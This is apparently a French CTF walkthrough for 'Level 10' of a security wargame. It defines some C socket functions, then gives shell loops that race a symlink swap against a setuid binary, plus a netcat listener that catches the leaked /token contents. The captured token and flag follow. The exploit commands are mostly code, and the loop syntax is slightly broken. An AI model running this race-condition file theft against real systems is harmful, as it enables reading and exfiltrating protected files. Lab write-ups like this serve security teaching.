# Level 10

## Recherche
---
socket : Socket programming is a way of connecting two nodes on a network to communicate with each other. One socket(node) listens on a particular port at an IP, while the other socket reaches out to the other to form a connection. The server forms the listener socket while the client reaches out to the server.

fflush : fflush() is typically used for output stream only. Its purpose is to clear (or flush) the output buffer and move the buffered data to console (in case of stdout) or disk (in case of file output stream). Below is its syntax.

exit : exit() terminates the calling process without executing the rest code which is after the exit() function. 

htons : The htons function converts a u_short from host to TCP/IP network byte order (which is big-endian).

connect : The connect() function establishes the connection of a socket between a client and a server.

puts : used to write a line or string to the output( stdout ) stream. It prints the passed string with a newline and returns an integer value. The return value depends on the success of the writing procedure.

dans un terminal avec ssh ouvert sur la vm creer ce script dolink
il va supprimer si ca existe et recreer un lien symbolique entre token et tmpflag10
#!/bin/sh
while [1]
do 
	rm -rf /tmp/flag10
	touch /tmp/flag10
	rm -rf /tmp/flag10
	ln -s /token /tmp/flag10
done

dans un autre terminal avec ssh ouvert sur la vm creer ce script uselink
la c'est juste bourrin, il va forcer la connexion pour qu'il y en ait une qui passe entre le moment ou ca check le fichier et le moment ou ca check la connexion, il y en a toujours au moins 1/5 qui passe
#!/bin/sh
while [1]
do 
	./level10 /tmp/flag10 192.168.56.101
done

la ligne qui suit, a effectuer dans 1 3eme terminal, permet de lire la sortie d'avant, et donc recuperer le flag, pour avoir le getflag
nc -kl 6969


.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.

---
## Flag : feulo4b72j7edeahuete3no7c
---
## Sitographie

